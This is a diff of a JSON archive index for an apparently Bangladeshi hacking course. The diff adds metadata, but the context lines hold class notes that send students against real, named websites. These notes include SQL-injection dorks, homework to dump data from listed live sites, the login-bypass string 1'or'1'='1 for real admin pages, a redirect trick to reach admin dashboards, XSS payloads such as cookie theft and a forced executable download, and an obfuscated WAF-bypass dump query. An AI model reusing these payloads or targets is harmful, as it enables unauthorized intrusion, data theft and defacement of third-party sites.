@@ -201,7 +201,8 @@
       "noteText": "First class: Cyber Safety, SQL Injection by tools\nBatch: 66, Delta\n—----------------------------------------------------------------------------------------------------\nAttendance: https://forms.gle/G7FY71jBU996kuaB8\n\n\nসবাই এই ফর্ম থেকে উপস্থিতি দিয়ে দিন। সময়ঃ ৯ টা ৪৫ পর্যন্ত।\n—----------------------------------------------------------------------------------------------------\n\n\n\n\nhttp://estuarydispatch.site/article.php?id=2\n\n\n\n\nSec 1.1   \n===================================================\n\nSite: https://native.edu.pk/\nPoint: http://native.edu.pk/detail.php?ComCatID=11\nDork: php?id= site:\nphp?id= site:https://native.edu.pk/\n\n\n'\nPoint: http://native.edu.pk/detail.php?ComCatID=11\nGet the details\n\n\nanalyze - tables - get tables - (select account db / admin / user / userinfo ) get column - ( select username password ) get data \n\n\nb0000000000000000000oOOO0m xD \n\n===================================================\n\n\n\n\nSec 1.2   \n===================================================\n\nSite: http://www.embryohotel.com\nPoint: http://www.embryohotel.com/room-detail.php?id=1\nDork: php?id= site:\nphp?id= site:http://www.embryohotel.com\n\n\n'\nPoint: http://www.embryohotel.com/room-detail.php?id=1\nGet the details\n\n\nanalyze - tables - get tables - (select account db / admin / user / userinfo ) get column - ( select username password ) get data \n\n\nb0000000000000000000oOOO0m xD \n\n===================================================\n\n\n\n\nSec 2 Official CW:\n===================================================\nhttp://www.siemerc.com.br/site/evento.php?id=2\n\n\nCW Submit: [সীমিত প্রবেশাধিকার]\n\n\n\n\n\n\nCandidato (Table) - Cidade (Passwords)\n===================================================",
       "noteSource": "https://docs.google.com/document/d/10FjEY5eyXUc54sUamu2-uj-8m5N03Cuwf-PKuDVimcM/edit?tab=t.0",
       "noteUrl": "https://arena-b66-delta-archive.vercel.app/notes/entry-39.txt",
-      "noteVerified": true
+      "noteVerified": true,
+      "documentUrl": "https://arena-b66-delta-archive.vercel.app/notes/entry-39.txt"
     },
     {
       "id": "entry-40",
@@ -464,7 +465,8 @@
       "noteText": "Admission dept hotline: +8801310333444 (WhatsApp)\nDiploma module: https://drive.google.com/file/d/1zUvuT2YHsbMWECLM0eCmvTh3nMh1GM2g/view\n\n\nSession hijacking / Blocking, Mid Exam prep - b66 Delta\n\n\nসবাই পোর্টালে লগিন করে উপস্থিতি দিয়ে দিন।  https://hw.arenaclass.stream/\n\n\nCyber fox: https://www.facebook.com/groups/awsb66delta/posts/1610713203964602\n\n\nসবাই সাইবার ফক্স ব্রাউজারটা চালু করে নিন। ক্লাসের টুলস হিসেবে মঙ্গলবার দেওয়া হয়েছিলো। কারো এখনো করা না থাকলে পোষ্ট থেকে ভিডিওটা দেখে ৯ টা ৪৫ মিনিটের মধ্যে সাইবার ফক্স ওপেন করে নিবেন। ধন্যবাদ। \nNb: extract অবশ্যই winrar দিয়ে করে নিতে হবে, ভিডিওতে সব কিছু সুন্দর করে দেখানো আছে।\n\n\n\n\nSite: 1\nhttps://jjfabrics.in/admin/\n\n\nhttps://jjfabrics.in/admin/login.php\n\n\nStep 1: Open cyberfox- tools - no redirect\n(no redirect)   add - https://jjfabrics.in/admin/login.php (যেই লিংকটা আমাকে ব্লক করতে হবে তা দিবো) - add -  ok\n\n\nStep 2: Now go to: https://jjfabrics.in/admin   (সাইবার ফক্স ব্রাউজার দিয়ে এবার শুধু এডমিন পেজে লগিন করুন, দেখবেন আপনাকে আর লগিন পেজে রিডাইরেক্ট করবে না। ডিরেক্ট এডমিন এক্সেস পেয়ে যাবেন।) \n\n\nStep 3: N.B: Your connection not secured - advance - add expectation - confirm security expectation \n\n\n\n\nSite 2: https://sphp.in/Admin/login.php\n\n\nSite 3: https://arpantek.in/admin/login.php\n\n\n\n\nSite :4 try this one, এটা করতে পারলেই ছুটি। ;) \n\nhttps://brahmaputracollege.com/admin/\nhome.php    dashboard.php    banner.php   users.php  gallery.php   welcome.php\nhome    dashboard    banner   users  gallery   welcome\n\n\nSite : 5 \nTry this one,\nhttps://sucic.org/admin/      (block)\nLink: https://sucic.org/admin/dashboard.php\n\n\n\n\nCW: [সীমিত প্রবেশাধিকার]",
       "noteSource": "https://docs.google.com/document/d/1-GJQv075oX67PWxaSWyKnsUMWyLMWbtuZQfBB37UAwU/edit?tab=t.0",
       "noteUrl": "https://arena-b66-delta-archive.vercel.app/notes/entry-7.txt",
-      "noteVerified": true
+      "noteVerified": true,
+      "documentUrl": "https://arena-b66-delta-archive.vercel.app/notes/entry-7.txt"
     },
     {
       "id": "entry-58",
@@ -1088,7 +1090,11 @@
       "playbackVerified": true,
       "playbackVerifiedAt": "2026-10-08",
       "videoProvider": "dailymotion",
-      "duration": "0:08:20"
+      "duration": "0:08:20",
+      "resourceKinds": [
+        "tools",
+        "documents"
+      ]
     },
     {
       "id": "entry-124",
@@ -1539,7 +1545,8 @@
       "noteText": "Sec 1:\n—-------------------\n1. https://en.wikipedia.org/wiki/List_of_Internet_top-level_domains\n2. https://en.wikipedia.org/wiki/Country_code_top-level_domain\n—-------------------\n\n\n\n\n\n\n2.1 —-------------------------------------------------------------------------------------------\n\n\nFront end: https://www.bamesschool.com.ng/\n\n\nBack end:  https://www.bamesschool.com.ng/secondary/admin/login.php\n\n\nusername: password\n1'or'1'='1\n1'or'1'='1\n—-------------------------------------------------------------------------------------------\n\n\n\n\n2.2 —-------------------------------------------------------------------------------------------\n\n\nhttps://brahmaputradegreecollege.edu.in/dpt_login/index.php\n\n\n\n\n\n\nusername: password\n1'or'1'='1\n1'or'1'='1\n—-------------------------------------------------------------------------------------------\n\n\n\n\n2.3 —-------------------------------------------------------------------------------------------\n\n\nhttps://www.online.pharmaasia.com.pk/admin/login.php\n\n\n\n\n\n\nusername: password\n1'or'1'='1\n1'or'1'='1\n—-------------------------------------------------------------------------------------------\nSec 3:\n—-------------------------------------------------------------------------------------------\nDork = Advance search technique\n1337 / leet  - https://1337.me\n—-------------------------------------------------------------------------------------------\n\n\n\n\nSec 4: \n—-------------------------------------------------------------------------------------------\nDork:\nei duita te beshi kaj hobe.\n\n\ninurl: admin/login.php site:.com\ninurl: admin/login.php site:.in\ninurl: admin/login.php\ninurl: admin/index.php\ninurl: admin\ninurl: login.php\ninurl: login.php site:.in\n1'or'1'='1\n\n\n—-------------------------------------------------------------------------------------------\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nOrientation Class: B66 Delta\nDate: 19/07/2026\n\n\nAttendance form: https://forms.gle/49vegvDWTkNjdKB46\n\n\n\n\n\n\nসবাই এই ফর্মে গিয়ে উপস্থিতি দিয়ে দিন।\n১। আপাতত সাউন্ড অফ আছে, লাইভ ক্লাস শুরু হচ্ছে ৯টা ৪৫ মিনিট থেকে।\n২। পোর্টালে লগিন করার প্রয়োজন নেই। আমরা পর্যায়ক্রমে পোর্টালে সংযুক্ত হবো।\n৩। গুগল ফর্ম থেকে উপস্থিতি দিয়ে দিন। সেখানে আপনার তথ্যগুলো দিয়ে সাবমিট করলে স্বয়ংক্রিয় ভাবেই attendance হয়ে যাবে এবং আপনাকে কনফার্মেশন মেসেজ দেখাবে।\n৪। উপস্থিতি দেওয়া হলে ৯ টা ৪৫ মিনিট মানে ক্লাস শুরু হওয়া পর্যন্ত অপেক্ষা করুন। ধন্যবাদ।",
       "noteSource": "https://docs.google.com/document/d/12U7ODuPdJCVEfEuIVt27d57fDxhtskkkT6lBZbohD2M/edit",
       "noteUrl": "https://arena-b66-delta-archive.vercel.app/notes/entry-22.txt",
-      "noteVerified": true
+      "noteVerified": true,
+      "documentUrl": "https://arena-b66-delta-archive.vercel.app/notes/entry-22.txt"
     },
     {
       "id": "entry-23",
@@ -1816,7 +1823,11 @@
       "noteText": "Dump the data of any three websites from here\n\n\nGoogle Dork\n\tSite Links\n\tphp?id= site:\n\thttp://www.ingenium.co.th/\n\tphp?id= site:\n\thttp://www.embryohotel.com/\n\tphp?id= site:\n\thttps://www.pupilbooks.in/\n\tphp?id= site:\n\thttp://polymat.co.th/\n\tphp?id= site:\n\thttp://www.meridianhotel.co.ug/\n\tphp?id= site:\n\thttp://csi-india.org/\n\tphp?id= site:\n\thttp://www.cmkoo.com.hk/\n\tphp?id= site:\n\thttp://native.edu.pk/\n\tphp?id= site:\n\thttp://www.igoergo.com/\n\tphp?id= site:\n\thttp://www.pkw.ac.th/\n\t\n\n\n\n\n\nExample of homework PDF",
       "noteSource": "https://docs.google.com/document/d/129j6c7u1S-e6atUbnlis50Cnpm3qtrHaKP_KSENe_eo/edit?usp=sharing",
       "noteUrl": "https://arena-b66-delta-archive.vercel.app/notes/entry-41.txt",
-      "noteVerified": true
+      "noteVerified": true,
+      "relatedRecordingId": "entry-40",
+      "classDate": "2026-07-24",
+      "classDateVerification": "SQL Injection by tools ক্লাসের সংরক্ষিত homework নোটের সঙ্গে মিলিয়ে যুক্ত।",
+      "documentUrl": "https://arena-b66-delta-archive.vercel.app/notes/entry-41.txt"
     },
     {
       "id": "entry-42",
@@ -1859,7 +1870,8 @@
       "noteText": "Imp post: https://www.facebook.com/groups/awsb66delta/posts/1609893780713211\nHW: https://forms.gle/fPiaspqK6eU3vibL7\n\n\n\n\nOSINT -\n\n\nসবাই পোর্টালে লগিন করে উপস্থিতি দিয়ে দিন। \nপ্রথমে https://hw.arenaclass.stream/  আপনার একাউন্ট দিয়ে প্যানেলে লগিন করুন। উল্লেখ্য, আপনি হোমওয়ার্ক জমা দেওয়ার জন্য যেই আইডি পাসওয়ার্ড দিয়ে লগিন করেন সেটাই student panel.\n\n\nএরপর join class এ ক্লিক করুন। take attendance এ ক্লিক করলেই উপস্থিতি জমা হয়ে যাবে।\n\n\n\n\n1.1\n—----------------------------------------------------------------------------------------\nYour ip: https://whatismyipaddress.com/\nTrack: https://grabify.link/\n\nIp2Loc: https://whatismyipaddress.com/ip-lookup\n\n\nVideo: https://drive.google.com/file/d/19kNyR9LPDIAnq4EvsKzZOqvD6xTtJBjF/view?usp=drive_link\n—----------------------------------------------------------------------------------------\n\n\n\n\n1.2\n—----------------------------------------------------------------------------------------\nNotice: https://hackerinstitutebd.blogspot.com/2024/08/blog-post.html\n—----------------------------------------------------------------------------------------\n\n\n1.3\n—----------------------------------------------------------------------------------------\nhttps://whois.domaintools.com/      amardesh.com\nBdia btcl\nWayback machine\n—----------------------------------------------------------------------------------------\n\n\ntanjim@arenawebsecurity.net\nceo@arenawebsecurity.net\n\n\n1.4:\n—----------------------------------------------------------------------------------------\nURL: https://www.dainikcoxsbazar.com/\nCW: [সীমিত প্রবেশাধিকার]\n\n\n—----------------------------------------------------------------------------------------",
       "noteSource": "https://docs.google.com/document/d/1PVu1YmjTLqqe5ZToj9tb8fErVG36hUUxxVlHmNh9rZE/edit",
       "noteUrl": "https://arena-b66-delta-archive.vercel.app/notes/entry-43.txt",
-      "noteVerified": true
+      "noteVerified": true,
+      "documentUrl": "https://arena-b66-delta-archive.vercel.app/notes/entry-43.txt"
     },
     {
       "id": "entry-44",
@@ -2122,7 +2134,10 @@
       "videoStatus": "not-applicable",
       "truncated": false,
       "collectionIndex": 60,
-      "dateVerified": false
+      "dateVerified": false,
+      "relatedRecordingId": "entry-64",
+      "classDate": "2026-08-02",
+      "classDateVerification": "পোস্টে উল্লেখ করা নির্দিষ্ট ক্লাসের বিষয় ও যাচাই করা ক্লাস টপিক মিলিয়ে যুক্ত; পোস্টের তারিখ অনুমান করা হয়নি।"
     },
     {
       "id": "entry-63",
@@ -2145,7 +2160,11 @@
       "noteText": "Manual dump the data of any five websites from here\n\n\nGoogle Dork\n\tSite Links\n\tphp?id= site:\n\thttps://aueqi.in/\n\tphp?id= site:\n\thttps://native.edu.pk/\n\tphp?id= site:\n\thttps://www.xeroflor.sg/\n\tphp?id= site:\n\thttps://www.cr-led.com/\n\tphp?id= site:\n\thttps://www.igoergo.com/\n\tphp?id= site:\n\thttps://www.ncbms.edu.pk/\n\tphp?id= site:\n\thttps://www.cmkoo.com.hk/\n\tphp?id= site:\n\thttps://www.fsaijazuddin.pk/\n\tphp?id= site:\n\thttp://www.meridianhotel.co.ug/\n\tphp?id= site:\n\thttp://www.diamondhills.com.pk/\n\t\n\n\n\n\n\nExample of homework PDF",
       "noteSource": "https://docs.google.com/document/d/1nFaeFgkMQ6EN0SXgnOKax06xKqMsVIMdFTabBcUaEp4/edit?usp=sharing",
       "noteUrl": "https://arena-b66-delta-archive.vercel.app/notes/entry-63.txt",
-      "noteVerified": true
+      "noteVerified": true,
+      "relatedRecordingId": "entry-64",
+      "classDate": "2026-08-02",
+      "classDateVerification": "Manual SQL Injection homework-এর সংরক্ষিত মূল লেখা অনুযায়ী যুক্ত।",
+      "documentUrl": "https://arena-b66-delta-archive.vercel.app/notes/entry-63.txt"
     },
     {
       "id": "entry-65",
@@ -2332,7 +2351,11 @@
       "noteText": "Cross Site Scripting (XSS)\n\n\nAttendance Link: https://hw.arenaclass.stream/class_live/\n\n\nXSS Concept: https://s4mc71.github.io/interactive-xss-simulator/\n\n\nPractice Site: https://clemensantikvariat.dk/\n\n\n\n\n<script>alert(\"Hacked_By_AWS_64\")</script>\n\n\n<script>location.href=\"https://arenawebsecurity.net/diploma-in-cyber-security\";</script>\n\n\n\n\nhttps://clemensantikvariat.dk/search.php?searchString=%3Cscript%3Ealert%28%22Hacked_By_AWS_64%22%29%3C%2Fscript%3E\n\n\n\n\nhttps://clemensantikvariat.dk/search.php?searchString=%3Cscript%3Elocation.href%3D%22https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DdQw4w9WgXcQ%22%3B%3C%2Fscript%3E%0A\n\n\n\n\nhttps://clemensantikvariat.dk/search.php?searchString=%3Cscript%3EsetInterval%28%28%29%20%3D%3E%20%7Bdocument.body.style.transform%20%3D%20%22rotate%28%22%2B%28Math.random%28%29%2A2%20-%201%29%2B%22deg%29%20translate%28%22%2B%28Math.random%28%29%2A10%20-%205%29%2B%22px%2C%22%2B%28Math.random%28%29%2A10%20-%205%29%2B%22px%29%22%3B%7D%2C%2050%29%3B%3C%2Fscript%3E\n\n\n\n\nhttps://clemensantikvariat.dk/search.php?searchString=%3Cscript%3E%20window.location.href%20%3D%20%22https%3A%2F%2Fwww.voidtools.com%2FEverything-1.4.1.1032.x86-Setup.exe%22%3B%20%3C%2Fscript%3E\n________________\n\n\nStore Based: https://drive.google.com/drive/u/1/folders/1vy2UBxgXM1d6HeyQPy-y_jSPqag5wFCp\n\n\n\n\nhttps://aspirekeralajobs.com/cand-view.php?id=22663\n________________\nScript\n<script>alert(\"Hacked_By_AWS_64\")</script>\n\n\n<script>alert(document.cookie)</script>\n\n\n<script> window.location.href = \"https://www.voidtools.com/Everything-1.4.1.1032.x86-Setup.exe\"; </script>\n\n\n<script>location.href=\"https://arenawebsecurity.net/diploma-in-cyber-security\";</script>\n\n\n<script>location.href=\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\";</script>\n\n\n<script>setInterval(() => {document.body.style.transform = \"rotate(\"+(Math.random()*2 - 1)+\"deg) translate(\"+(Math.random()*10 - 5)+\"px,\"+(Math.random()*10 - 5)+\"px)\";}, 50);</script>\n\n\n<style> @keyframes spin{to{transform:rotate(360deg)}} body{animation:spin 2s linear infinite} </style>\n\n\n<script> alert(\"Page hacked with XSS 🎨\");  document.body.style.background=\"linear-gradient(45deg, red, yellow)\"; </script>\n\n\n<script> speechSynthesis.speak(new SpeechSynthesisUtterance(\"Hello Students! This is X S S demo!\")); </script>\n\n\n\n\nXSS dork\n/?s= site:.in\n/search?q= site:.in\n/index.php?lang= site:.in\n/index.php?page= site:.in\n/search?query= site:.in\n/search?keyword= site:.in\n/search/?q= site:.in\n/connexion?redirect_uri= site:.in\n/?page= site:.in\n/search/?s= site:.in\n/?keywords= site:\n/search/?keyword= site:.in\n/search-results?q=\ninurl:\".php?query=\"\ninurl:\".php?searchstring=\"\ninurl:\".php?keyword=\"\ninurl:\".php?file=\"\ninurl:\".php?years=\"\ninurl:\".php?txt=\"\npage_details.php?menu_id=\ngallery.php?menu_id=\ninurl:\".php?tag=\"\ninurl:\".php?max=\"\ninurl:\".php?from=\"\ninurl:\".php?author=\"\ninurl:\".php?pass=\"\ninurl:\".php?feedback=”",
       "noteSource": "https://docs.google.com/document/d/1Rem_8oiP3SkVgZvpZ8ES1IhGXUyfivD1pnoiMhdIsSs/edit?usp=sharing",
       "noteUrl": "https://arena-b66-delta-archive.vercel.app/notes/entry-75.txt",
-      "noteVerified": true
+      "noteVerified": true,
+      "relatedRecordingId": "entry-80",
+      "classDate": "2026-08-09",
+      "classDateVerification": "সংরক্ষিত XSS Class Resource ও ক্লাসের যাচাই করা টপিক অনুযায়ী যুক্ত।",
+      "documentUrl": "https://arena-b66-delta-archive.vercel.app/notes/entry-75.txt"
     },
     {
       "id": "entry-76",
@@ -2349,7 +2372,10 @@
       "videoStatus": "not-applicable",
       "truncated": false,
       "collectionIndex": 75,
-      "dateVerified": false
+      "dateVerified": false,
+      "relatedRecordingId": "entry-80",
+      "classDate": "2026-08-09",
+      "classDateVerification": "পোস্টে উল্লেখ করা নির্দিষ্ট ক্লাসের বিষয় ও যাচাই করা ক্লাস টপিক মিলিয়ে যুক্ত; পোস্টের তারিখ অনুমান করা হয়নি।"
     },
     {
       "id": "entry-77",
@@ -2446,7 +2472,10 @@
       "videoStatus": "not-applicable",
       "truncated": false,
       "collectionIndex": 83,
-      "dateVerified": false
+      "dateVerified": false,
+      "relatedRecordingId": "entry-88",
+      "classDate": "2026-08-14",
+      "classDateVerification": "পোস্টে উল্লেখ করা নির্দিষ্ট ক্লাসের বিষয় ও যাচাই করা ক্লাস টপিক মিলিয়ে যুক্ত; পোস্টের তারিখ অনুমান করা হয়নি।"
     },
     {
       "id": "entry-86",
@@ -2466,7 +2495,10 @@
       "truncated": false,
       "collectionIndex": 85,
       "dateVerified": false,
-      "contentVerified": true
+      "contentVerified": true,
+      "relatedRecordingId": "entry-88",
+      "classDate": "2026-08-14",
+      "classDateVerification": "পোস্টে উল্লেখ করা নির্দিষ্ট ক্লাসের বিষয় ও যাচাই করা ক্লাস টপিক মিলিয়ে যুক্ত; পোস্টের তারিখ অনুমান করা হয়নি।"
     },
     {
       "id": "entry-89",
@@ -2489,7 +2521,11 @@
       "noteText": "SQLi WAF\n\n\n\n\nhttps://securityidiots.com/\n\n\nOrder by \n\n\nUnion Select\n\n\nConcat\n\n\nFrom\n\n\ninformation_schema.(tables,colums)\n\n\n\n\n\n\n/*!50000%63%4f%6e%63At/**x**/*/(0x222f3e272f3e3c6c696e6b2072656c3d227374796c6573686565742220687265663d2268747470733a2f2f737461636b706174682e626f6f74737472617063646e2e636f6d2f626f6f7473747261702f342e352e322f6373732f626f6f7473747261702e6d696e2e637373223e3c2f62723e3c696d67207372633d2268747470733a2f2f692e696d6775722e636f6d2f3457455a5a6c512e676966222077696474683d323030206865696768743d32303020636c6173733d22696d616765222f3e3c6469762069643d227469746c65223e437233572d544d3c2f62723e20587e41736820776173206865726520f09f94a53c2f6469763e3c2f62723e3c623e3c613e3c63656e7465723e4461746162617365203a3a20,/*!50000daTaBAsE/**x**/*/(),0x3c2f62723e55736572203a3a20,/*!50000UsEr/**x**/*/(),0x3c2f62723e56657273696f6e203a3a20,/*!50000vErsIOn/**x**/*/(),0x3c2f61333e3c2f62313e3c2f62723e3c61343e,(selEct(@x)/*!50000fRom/**x**/*/(/*!50000sElect/**x**/*/(@x:=0x00),(sElect(0)/*!froM/**x**/*/(/*!50000inforMation_schEma/**/.coLuMns/**x**/*/)/*!50000Where/**x**/*/(taBle_schema=/*!50000DatAbase/**x*/*/())and(0x00)in(@x:=/*!50000%63%6f%4ecat/**x**/*/(@x,0x3c62723e,/*!50000tAble_naMe/**x**/*/,0x3c2f61333e3c61323e203a3a3a3a203c2f61323e3c61313e,/*!50000colUmn_naMe/**x**/*/,0x3c2f61313e))))x),0x3c2f61343e)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nconcat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a20416c69204b68616e2028416b446b292044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/",
       "noteSource": "https://docs.google.com/document/d/1QAdlTL9FowtSZCWQxIanBL0aJrec_gmlwzxKoyRS5CM/edit?usp=sharing",
       "noteUrl": "https://arena-b66-delta-archive.vercel.app/notes/entry-89.txt",
-      "noteVerified": true
+      "noteVerified": true,
+      "relatedRecordingId": "entry-88",
+      "classDate": "2026-08-14",
+      "classDateVerification": "সংরক্ষিত SQLi WAF নোট ও ক্লাসের যাচাই করা টপিক অনুযায়ী যুক্ত।",
+      "documentUrl": "https://arena-b66-delta-archive.vercel.app/notes/entry-89.txt"
     },
     {
       "id": "entry-91",
@@ -2657,7 +2693,10 @@
       "videoStatus": "not-applicable",
       "truncated": false,
       "collectionIndex": 96,
-      "dateVerified": false
+      "dateVerified": false,
+      "relatedRecordingId": "entry-99",
+      "classDate": "2026-08-21",
+      "classDateVerification": "পোস্টে উল্লেখ করা নির্দিষ্ট ক্লাসের বিষয় ও যাচাই করা ক্লাস টপিক মিলিয়ে যুক্ত; পোস্টের তারিখ অনুমান করা হয়নি।"
     },
     {
       "id": "entry-98",
@@ -2694,7 +2733,10 @@
       "videoStatus": "not-applicable",
       "truncated": false,
       "collectionIndex": 99,
-      "dateVerified": false
+      "dateVerified": false,
+      "relatedRecordingId": "entry-99",
+      "classDate": "2026-08-21",
+      "classDateVerification": "পোস্টে উল্লেখ করা নির্দিষ্ট ক্লাসের বিষয় ও যাচাই করা ক্লাস টপিক মিলিয়ে যুক্ত; পোস্টের তারিখ অনুমান করা হয়নি।"
     },
     {
       "id": "entry-101",
@@ -2756,7 +2798,11 @@
       "originalFileLinks": [
         "https://www.facebook.com/download/1420612573243103/Webshell-B.pdf"
       ],
-      "backupDocumentUrl": "https://drive.google.com/file/d/1WkaeZzMyHFRDHz1tKIErZfj7cka5-XNG/view"
+      "backupDocumentUrl": "https://drive.google.com/file/d/1WkaeZzMyHFRDHz1tKIErZfj7cka5-XNG/view",
+      "resourceKinds": [
+        "documents",
+        "notes"
+      ]
     },
     {
       "id": "entry-104",
@@ -2773,7 +2819,10 @@
       "videoStatus": "not-applicable",
       "truncated": false,
       "collectionIndex": 103,
-      "dateVerified": false
+      "dateVerified": false,
+      "relatedRecordingId": "entry-99",
+      "classDate": "2026-08-21",
+      "classDateVerification": "পোস্টে উল্লেখ করা নির্দিষ্ট ক্লাসের বিষয় ও যাচাই করা ক্লাস টপিক মিলিয়ে যুক্ত; পোস্টের তারিখ অনুমান করা হয়নি।"
     },
     {
       "id": "entry-106",
@@ -2853,7 +2902,11 @@
       "originalFileLinks": [
         "https://www.facebook.com/download/1615848803430194/Files%20Uploading%20Vulnerabilities.pdf"
       ],
-      "backupDocumentUrl": "https://drive.google.com/file/d/1vLTPR3iNcx1eMC95MtnusMT36ZEjrqfk/view"
+      "backupDocumentUrl": "https://drive.google.com/file/d/1vLTPR3iNcx1eMC95MtnusMT36ZEjrqfk/view",
+      "resourceKinds": [
+        "documents",
+        "notes"
+      ]
     },
     {
       "id": "entry-109",
@@ -2881,7 +2934,11 @@
       "originalFileLinks": [
         "https://www.facebook.com/download/1417754170268096/FileUV.pdf"
       ],
-      "backupDocumentUrl": "https://drive.google.com/file/d/1AyJ2fl5INaP73482NB3A2lut5sjXm8Aw/view"
+      "backupDocumentUrl": "https://drive.google.com/file/d/1AyJ2fl5INaP73482NB3A2lut5sjXm8Aw/view",
+      "resourceKinds": [
+        "documents",
+        "notes"
+      ]
     },
     {
       "id": "entry-110",
@@ -3011,7 +3068,11 @@
       "originalFileLinks": [
         "https://www.facebook.com/download/932554422682616/Batch_Scripting_Short_Notes.pdf"
       ],
-      "backupDocumentUrl": "https://drive.google.com/file/d/1lRDz9r0yi4dVK51vFzpUJ7YJgExCRfsB/view"
+      "backupDocumentUrl": "https://drive.google.com/file/d/1lRDz9r0yi4dVK51vFzpUJ7YJgExCRfsB/view",
+      "resourceKinds": [
+        "documents",
+        "notes"
+      ]
     },
     {
       "id": "entry-119",
@@ -3028,7 +3089,10 @@
       "videoStatus": "not-applicable",
       "truncated": false,
       "collectionIndex": 118,
-      "dateVerified": false
+      "dateVerified": false,
+      "relatedRecordingId": "entry-117",
+      "classDate": "2026-09-04",
+      "classDateVerification": "পোস্টে উল্লেখ করা নির্দিষ্ট ক্লাসের বিষয় ও যাচাই করা ক্লাস টপিক মিলিয়ে যুক্ত; পোস্টের তারিখ অনুমান করা হয়নি।"
     },
     {
       "id": "entry-120",
@@ -3048,7 +3112,11 @@
       "truncated": false,
       "collectionIndex": 119,
       "dateVerified": false,
-      "relatedRecordingId": "entry-122"
+      "relatedRecordingId": "entry-122",
+      "resourceKinds": [
+        "tools",
+        "documents"
+      ]
     },
     {
       "id": "entry-123",
@@ -3067,7 +3135,10 @@
       "collectionIndex": 122,
       "dateVerified": false,
       "contentVerified": true,
-      "classStartTime": "রাত ৯:৪৫ (9:45 PM)"
+      "classStartTime": "রাত ৯:৪৫ (9:45 PM)",
+      "relatedRecordingId": "entry-126",
+      "classDate": "2026-09-13",
+      "classDateVerification": "পোস্টে উল্লেখ করা নির্দিষ্ট ক্লাসের বিষয় ও যাচাই করা ক্লাস টপিক মিলিয়ে যুক্ত; পোস্টের তারিখ অনুমান করা হয়নি।"
     },
     {
       "id": "entry-125",
@@ -3124,7 +3195,11 @@
       "originalFileLinks": [
         "https://www.facebook.com/download/1070691385721202/What%20is%20Crypter%20Antivirus%20%26%20Virus.pdf"
       ],
-      "backupDocumentUrl": "https://drive.google.com/file/d/1pqLcxWJ3ff1DtLFCeAH5weTXjl26xXCH/view"
+      "backupDocumentUrl": "https://drive.google.com/file/d/1pqLcxWJ3ff1DtLFCeAH5weTXjl26xXCH/view",
+      "resourceKinds": [
+        "documents",
+        "notes"
+      ]
     },
     {
       "id": "entry-128",
@@ -3212,7 +3287,11 @@
       "originalFileLinks": [
         "https://www.facebook.com/download/1056508810719747/Web%20Server.pdf"
       ],
-      "backupDocumentUrl": "https://drive.google.com/file/d/17PU-_wPXtJ0zI1IocRHg9Lu2cq6t5OqK/view"
+      "backupDocumentUrl": "https://drive.google.com/file/d/17PU-_wPXtJ0zI1IocRHg9Lu2cq6t5OqK/view",
+      "resourceKinds": [
+        "documents",
+        "notes"
+      ]
     },
     {
       "id": "entry-133",
@@ -3261,7 +3340,8 @@
       "backupDocumentUrl": "https://drive.google.com/file/d/1fuBx65kgXos55G4_tN9x6Mb6hF1ckl8a/view",
       "resourceKinds": [
         "documents",
-        "tools"
+        "tools",
+        "notes"
       ]
     },
     {
@@ -3615,6 +3695,10 @@
           "kind": "tool",
           "preservedAt": "2026-10-08"
         }
+      ],
+      "resourceKinds": [
+        "tools",
+        "documents"
       ]
     },
     {
@@ -3630,7 +3714,9 @@
         "entry-148"
       ],
       "resourceKinds": [
-        "tools"
+        "tools",
+        "documents",
+        "notes"
       ],
       "text": "ক্লাস ২২: ৭১:০০ মিনিটে Wordfence 9.0.2 ইনস্টল; ৭৫:০০–৮৩:০০ মিনিটে Standard scan।\nসেটআপ: WordPress → Plugins → Add New → Upload Plugin-এ ZIP দিন অথবা অফিসিয়াল Wordfence খুঁজুন। Activate করে নিজের সাইটের জন্য নিবন্ধন সম্পন্ন করুন। Wordfence → Scan → Start New Scan।\nফলাফল ও backup যাচাই ছাড়া কোনো ফাইল মুছবেন না। ZIP ক্লাসে দেখানো সংস্করণের; চলমান সাইটে সর্বশেষ আপডেট ব্যবহার করুন।",
       "links": [
@@ -3659,7 +3745,9 @@
         "entry-148"
       ],
       "resourceKinds": [
-        "tools"
+        "tools",
+        "documents",
+        "notes"
       ],
